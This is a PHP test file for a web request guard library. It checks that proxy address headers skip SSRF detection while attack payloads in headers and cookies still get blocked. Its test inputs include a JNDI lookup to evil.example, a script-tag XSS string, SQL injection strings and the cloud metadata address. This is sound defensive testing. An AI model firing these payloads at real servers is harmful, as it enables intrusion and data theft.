<?php

declare(strict_types=1);

use RenzoFranceschini\GuardCore\Config\SecurityConfig;
use RenzoFranceschini\GuardCore\Detection\HeaderExclusions;
use RenzoFranceschini\GuardCore\Detection\SusPatterns;
use RenzoFranceschini\GuardCore\Pipeline\Checks\SuspiciousActivityCheck;
use RenzoFranceschini\GuardCore\Request\GuardResponse;
use RenzoFranceschini\GuardCore\Request\GuardResponseFactory;
use RenzoFranceschini\GuardCore\Request\SimpleGuardRequest;
use RenzoFranceschini\GuardCore\Routing\RouteConfig;
use RenzoFranceschini\GuardCore\Routing\RouteResolver;

require __DIR__ . '/../vendor/autoload.php';

/**
 * Honesty tests for the excluded-header detection surface (port of
 * tests/test_detection_excluded_proxy_headers.py plus the header cases of
 * tests/test_detection_exclusion_integration.py).
 *
 * The excluded-header surface is the hardcoded proxy identity set
 * (HeaderExclusions::DEFAULT_EXCLUDED_HEADERS, the reference's
 * _DEFAULT_EXCLUDED_HEADERS) merged with the config field
 * excluded_detection_headers. An excluded header is not skipped: like the
 * reference's _scan_excluded_header_component it scans with every enabled
 * category except the ssrf skip resolved by
 * HeaderExclusions::skipCategories (address-carrying headers and
 * address-chain values), so a bare proxy address no longer false-positives
 * ssrf while sqli, xss and always-scan cmd_injection payloads in the same
 * header still detect.
 */

final class T
{
    public int $passed = 0;
    public int $failed = 0;

    public function same(mixed $expected, mixed $actual, string $label): void
    {
        if ($expected === $actual) {
            $this->passed++;
            echo "ok - {$label}\n";
        } else {
            $this->failed++;
            echo "FAIL - {$label}\n";
            echo '  expected: ' . var_export($expected, true) . "\n";
            echo '  actual:   ' . var_export($actual, true) . "\n";
        }
    }

    public function section(string $name): void
    {
        echo "\n=== {$name} ===\n";
    }
}

function makeCheck(?SecurityConfig $config = null): SuspiciousActivityCheck
{
    $config = $config ?? new SecurityConfig();

    return new SuspiciousActivityCheck(
        $config,
        new GuardResponseFactory(),
        new SusPatterns($config->detectionSemanticThreshold),
        null,
        new RouteResolver()
    );
}

/** @param array<string, string> $headers */
function blockedHeaders(SuspiciousActivityCheck $check, array $headers): bool
{
    $request = new SimpleGuardRequest(urlPath: '/items', method: 'POST', headers: $headers);
    $request->state()->clientIp = '9.9.9.9';

    return $check->check($request) instanceof GuardResponse;
}

const SCRIPT = '<script>alert(1)</script>';
const JNDI = '${jndi:ldap://evil.example/a}';
const SQLI = "203.0.113.10' OR '1'='1";

$t = new T();

$t->section('address-carrying proxy identity headers are not flagged by default');
$t->same(false, blockedHeaders(makeCheck(), ['x-forwarded-for' => '192.168.65.1']), 'x-forwarded-for private address does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-real-ip' => '10.0.0.5, 172.16.0.1']), 'x-real-ip address chain does not block');
$t->same(false, blockedHeaders(makeCheck(), ['cf-connecting-ip' => '127.0.0.1']), 'cf-connecting-ip loopback does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-envoy-external-address' => '127.0.0.1:8080']), 'envoy address with port does not block');
$t->same(false, blockedHeaders(makeCheck(), ['host' => '169.254.169.254']), 'host metadata address does not block');

$t->section('structured proxy header realistic values are not flagged');
$t->same(false, blockedHeaders(makeCheck(), ['forwarded' => 'for=127.0.0.1;proto=https']), 'forwarded entry does not block');
$t->same(false, blockedHeaders(makeCheck(), ['x-forwarded-proto' => 'https']), 'x-forwarded-proto value does not block');

$t->section('excluded headers still scan always-scan and per-category payloads');
$t->same(true, blockedHeaders(makeCheck(), ['x-forwarded-for' => JNDI]), 'jndi in x-forwarded-for still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['user-agent' => JNDI]), 'jndi in user-agent still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-real-ip' => JNDI]), 'jndi in x-real-ip still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-forwarded-for' => SQLI]), 'sqli in x-forwarded-for still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['user-agent' => SCRIPT]), 'xss in user-agent still blocks');

$t->section('non-excluded headers keep the full category scan');
$t->same(true, blockedHeaders(makeCheck(), ['x-not-a-proxy-header' => '192.168.65.1']), 'private address in an unknown header blocks');
$t->same(true, blockedHeaders(makeCheck(), ['x-plain-header' => "1 UNION SELECT username, password FROM users--"]), 'sqli in an unknown header blocks');

$t->section('configured exclusions suppress ssrf only');
$excluded = new SecurityConfig(excludedDetectionHeaders: ['x-custom-proxy-ip']);
$t->same(false, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => '10.0.0.5']), 'excluded custom header with address does not block');
$t->same(false, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => '10.0.0.5, 172.16.0.1']), 'excluded custom header with address chain does not block');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => SCRIPT]), 'excluded custom header with xss still blocks');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-custom-proxy-ip' => JNDI]), 'excluded custom header with jndi still blocks');
$t->same(true, blockedHeaders(makeCheck($excluded), ['x-other-header' => '192.168.65.1']), 'non-excluded header keeps the ssrf hit');
$t->same(true, blockedHeaders(makeCheck(), ['x-custom-proxy-ip' => '10.0.0.5']), 'without config the same custom address blocks');

$t->section('skip only applies within the enabled categories');
$ssrfOnly = new SecurityConfig(enabledDetectionCategories: ['ssrf']);
$t->same(false, blockedHeaders(makeCheck($ssrfOnly), ['x-real-ip' => '169.254.169.254']), 'excluded header with ssrf-only enabled skips entirely');
$t->same(true, blockedHeaders(makeCheck(new SecurityConfig(enabledDetectionCategories: ['ssrf'])), ['x-unknown' => '169.254.169.254']), 'non-excluded header with ssrf-only enabled still blocks');

$t->section('HeaderExclusions helpers');
$t->same([], HeaderExclusions::skipCategories('x-custom', '<script>alert(1)</script>'), 'non-address value on an unknown header skips nothing');
$t->same(['ssrf' => true], HeaderExclusions::skipCategories('x-custom', '10.0.0.5'), 'address value on an unknown header skips ssrf');
$t->same(['ssrf' => true], HeaderExclusions::skipCategories('X-Forwarded-For', 'anything'), 'address-carrying header skips ssrf for any value');
$t->same([], HeaderExclusions::skipCategories('  Referer  ', 'anything'), 'default-excluded non-address header skips nothing');

$t->same('1.2.3.4', HeaderExclusions::stripForwardedEntryPort('1.2.3.4'), 'bare IPv4 keeps');
$t->same('1.2.3.4', HeaderExclusions::stripForwardedEntryPort('1.2.3.4:8080'), 'IPv4 port strips');
$t->same('::1', HeaderExclusions::stripForwardedEntryPort('[::1]:8080'), 'bracketed IPv6 with port strips');
$t->same('[::1]junk', HeaderExclusions::stripForwardedEntryPort('[::1]junk'), 'bracketed form with junk tail keeps');
$t->same('2001:db8::1', HeaderExclusions::stripForwardedEntryPort('2001:db8::1'), 'bare IPv6 keeps');
$t->same('example.com', HeaderExclusions::stripForwardedEntryPort('example.com:80'), 'hostname port strips');

$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('192.168.65.1'), 'single private IP is a chain');
$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('10.0.0.5, 172.16.0.1'), 'comma-separated IPs are a chain');
$t->same(true, HeaderExclusions::valueLooksLikeAddressChain('[::1]:9090, 10.0.0.1'), 'mixed bracketed IPv6 and IPv4 are a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain(''), 'empty value is not a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain('not-an-ip'), 'bare word is not a chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain('10.0.0.5, evil.example'), 'one non-IP token breaks the chain');
$t->same(false, HeaderExclusions::valueLooksLikeAddressChain(SCRIPT), 'xss payload is not a chain');

$merged = HeaderExclusions::mergedExcludedNames(['X-Custom-Proxy' => true]);
$t->same(true, isset($merged['x-custom-proxy']), 'configured entries merge lowercased');
$t->same(true, isset($merged['x-forwarded-for']), 'default set stays merged in');
$t->same(count(HeaderExclusions::DEFAULT_EXCLUDED_HEADERS) + 1, count($merged), 'merge only adds the configured entry');

$t->section('config field validation and immutability');
$t->same([], array_keys((new SecurityConfig())->excludedDetectionHeaders), 'excludedDetectionHeaders defaults empty');
$t->same(['search'], array_keys((new SecurityConfig(excludedDetectionHeaders: ['search']))->excludedDetectionHeaders), 'header entries kept verbatim');
try {
    new SecurityConfig(excludedDetectionHeaders: 'x-custom');
    $t->same(true, false, 'bare string header exclusion rejected');
} catch (TypeError) {
    $t->same(true, true, 'bare string header exclusion rejected');
}
$threw = false;
try {
    new SecurityConfig(excludedDetectionHeaders: ['x-custom', 3]);
} catch (\InvalidArgumentException) {
    $threw = true;
}
$t->same(true, $threw, 'non-string entry rejected');
$base = new SecurityConfig();
$mutated = $base->with(['excluded_detection_headers' => ['x-late']]);
$t->same([], array_keys($base->excludedDetectionHeaders), 'with() leaves the original untouched');
$t->same(['x-late'], array_keys($mutated->excludedDetectionHeaders), 'with() carries the new exclusion');

$t->section('empty exclusion config keeps current behavior');
$t->same(true, blockedHeaders(makeCheck(), ['x-plain-header' => SCRIPT]), 'header attack blocks with no exclusions');
$t->same(false, blockedHeaders(makeCheck(), ['user-agent' => 'Mozilla/5.0', 'accept' => 'application/json']), 'benign proxy identity values do not block');

$t->section('opt-in semantic-only header exclusion (excluded_semantic_detection_headers)');
// A detection threshold of 0.1 makes the benign value below a semantic-only
// hit (no regex pattern matches it), the shape of a session cookie scoring
// near the production threshold.
const SEMANTIC_ONLY = 'theme=system';

/** @param array<string, string> $headers */
function blockedHeadersWithRoute(SuspiciousActivityCheck $check, array $headers, ?RouteConfig $route): bool
{
    $request = new SimpleGuardRequest(urlPath: '/items', method: 'POST', headers: $headers);
    $request->state()->clientIp = '9.9.9.9';
    $request->state()->routeConfig = $route;

    return $check->check($request) instanceof GuardResponse;
}

$lowThreshold = new SecurityConfig(detectionSemanticThreshold: 0.1);
$t->same([], array_keys($lowThreshold->excludedSemanticDetectionHeaders), 'excludedSemanticDetectionHeaders defaults empty');
$t->same(true, blockedHeaders(makeCheck($lowThreshold), ['x-session' => SEMANTIC_ONLY]), 'with no opt-in a semantic-only header value blocks');

$semanticExcluded = new SecurityConfig(detectionSemanticThreshold: 0.1, excludedSemanticDetectionHeaders: [' X-Session ']);
$t->same(false, blockedHeaders(makeCheck($semanticExcluded), ['x-session' => SEMANTIC_ONLY]), 'a semantic-excluded header (any case, trimmed) skips the semantic analyzer');
$t->same(true, blockedHeaders(makeCheck($semanticExcluded), ['x-other' => SEMANTIC_ONLY]), 'headers outside the set keep the semantic analyzer');
$t->same(true, blockedHeaders(makeCheck($semanticExcluded), ['x-session' => SCRIPT]), 'regex scanning of a semantic-excluded header is unchanged (xss)');
$t->same(true, blockedHeaders(makeCheck($semanticExcluded), ['x-session' => JNDI]), 'regex scanning of a semantic-excluded header is unchanged (jndi)');

$routeSet = new RouteConfig(excludedSemanticDetectionHeaders: ['X-Route']);
$t->same(false, blockedHeadersWithRoute(makeCheck($lowThreshold), ['x-route' => SEMANTIC_ONLY], $routeSet), 'a route-level semantic exclusion skips the semantic analyzer');
$t->same(true, blockedHeadersWithRoute(makeCheck($lowThreshold), ['x-route' => SEMANTIC_ONLY], null), 'without the route set the same header blocks');
$t->same(true, blockedHeadersWithRoute(makeCheck($lowThreshold), ['x-route' => SCRIPT], $routeSet), 'a route-level semantic exclusion keeps the regex scan');
$mergedGlobal = new SecurityConfig(detectionSemanticThreshold: 0.1, excludedSemanticDetectionHeaders: ['x-global']);
$t->same(false, blockedHeadersWithRoute(makeCheck($mergedGlobal), ['x-global' => SEMANTIC_ONLY], $routeSet), 'the route set merges with the global set (global entry)');
$t->same(false, blockedHeadersWithRoute(makeCheck($mergedGlobal), ['x-route' => SEMANTIC_ONLY], $routeSet), 'the route set merges with the global set (route entry)');
$t->same(null, (new RouteConfig())->excludedSemanticDetectionHeaders, 'RouteConfig semantic exclusion defaults null');

$base = new SecurityConfig();
$mutated = $base->with(['excluded_semantic_detection_headers' => ['x-late']]);
$t->same([], array_keys($base->excludedSemanticDetectionHeaders), 'with() leaves the original semantic set untouched');
$t->same(['x-late'], array_keys($mutated->excludedSemanticDetectionHeaders), 'with() carries the new semantic exclusion');

$t->section('the Cookie header scans one name=value pair at a time');
$enc = static fn (string $raw): string => rtrim(strtr(base64_encode($raw), '+/', '-_'), '=');
$sig = '';
for ($i = 0; $i < 64; $i++) {
    $sig .= chr($i);
}
$jwt = $enc('{"alg": "ES256", "typ": "JWT"}') . '.'
    . $enc('{"sub": "3f2c1b9e-8a47-4d2e-9c1f-5b6a7d8e9f01", "name": "Jane Doe (Acme)", "email": "jane.doe@example.com", "roles": ["admin"], "iat": 1792000000, "exp": 1792000900}') . '.'
    . $enc($sig);
$sessionCookie = 'session=' . $jwt . '; theme=system; _ga=GA1.1.123456789.1792000000';
$t->same(false, blockedHeaders(makeCheck(), ['cookie' => $sessionCookie]), 'a benign session cookie does not score as one semantic blob (each pair scans alone)');
$t->same(false, blockedHeaders(makeCheck(), ['Cookie' => $sessionCookie]), 'the Cookie header name matches case-insensitively');
$t->same(true, blockedHeaders(makeCheck(), ['x-session' => $sessionCookie]), 'the same value in another header keeps the whole-value scan');
$t->same(true, blockedHeaders(makeCheck(), ['cookie' => 'a=1; b=' . SCRIPT . '; c=3']), 'an attack pair in a cookie still blocks');
$t->same(true, blockedHeaders(makeCheck(), ['cookie' => 'a=1;' . JNDI]), 'a pair with no space after the separator still blocks');
$t->same(['a=b', 'c=d', "e=\r\nf", "\t"], SuspiciousActivityCheck::cookiePairs("a=b;  c=d ;;e=\r\nf; ;\t"), 'pairs trim spaces only (CR/LF and tab stay) and empty pairs are skipped');
$t->same([], SuspiciousActivityCheck::cookiePairs(' ; ;'), 'a cookie of empty pairs yields nothing');
$t->same(true, blockedHeaders(makeCheck($lowThreshold), ['cookie' => SEMANTIC_ONLY]), 'a semantic-only cookie pair blocks with no opt-in');
$cookieSemanticExcluded = new SecurityConfig(detectionSemanticThreshold: 0.1, excludedSemanticDetectionHeaders: ['Cookie']);
$t->same(false, blockedHeaders(makeCheck($cookieSemanticExcluded), ['cookie' => 'theme=system; _ga=GA1.1.123456789.1792000000']), 'the semantic opt-out applies to each cookie pair');
$t->same(true, blockedHeaders(makeCheck($cookieSemanticExcluded), ['cookie' => 'theme=system; b=' . SCRIPT]), 'regex still scans every pair of a semantic-excluded cookie');

echo "\npassed={$t->passed} failed={$t->failed}\n";
exit($t->failed === 0 ? 0 : 1);
